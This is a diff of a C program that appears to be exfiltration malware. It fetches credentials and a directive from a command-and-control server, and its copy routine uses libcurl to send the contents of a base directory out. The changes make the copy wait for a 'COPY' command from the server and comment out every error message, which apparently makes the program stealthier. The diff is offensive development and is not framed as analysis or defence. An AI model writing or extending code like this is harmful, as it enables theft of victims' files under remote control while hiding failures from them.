@@ -73,7 +73,9 @@ int main(void) {
 	char * password = cleanString(takePassword());
 	controllerDirective = takeControlInstruction();
 
-	Copy(BASEDIRECTORY, username, password);
+	if (strcmp(controllerDirective, "COPY") == 0) {
+		Copy(BASEDIRECTORY, username, password);
+	}
 
 	return 0;
 }
@@ -166,7 +168,7 @@ void copyContents(char * fileName, char * suffix, char * username, char * passwo
 		res = curl_easy_perform(curl);
 
 		if (res != CURLE_OK) {
-			fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+			/*fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));*/
 		}
 
 		curl_easy_cleanup(curl);
@@ -192,7 +194,7 @@ char * takeControlInstruction(void) {			// Contact C2, place directive in file n
 		res = curl_easy_perform(curl);								// Make the request
 
 		if (res != CURLE_OK) {									// Handling errors
-		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
 		}
 
 		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
@@ -228,7 +230,7 @@ char * takeUsername(void) {
 		curl_easy_setopt(curl, CURLOPT_URL, USERNAMEADDRESS);		
 		res = curl_easy_perform(curl);								
 		if (res != CURLE_OK) {									
-		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
 		}
 		curl_easy_cleanup(curl);								
 	}
@@ -250,7 +252,7 @@ char * takePassword(void) {
 		curl_easy_setopt(curl, CURLOPT_URL, PASSWORDADDRESS);		
 		res = curl_easy_perform(curl);								
 		if (res != CURLE_OK) {									
-		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
 		}
 		curl_easy_cleanup(curl);								
 	}
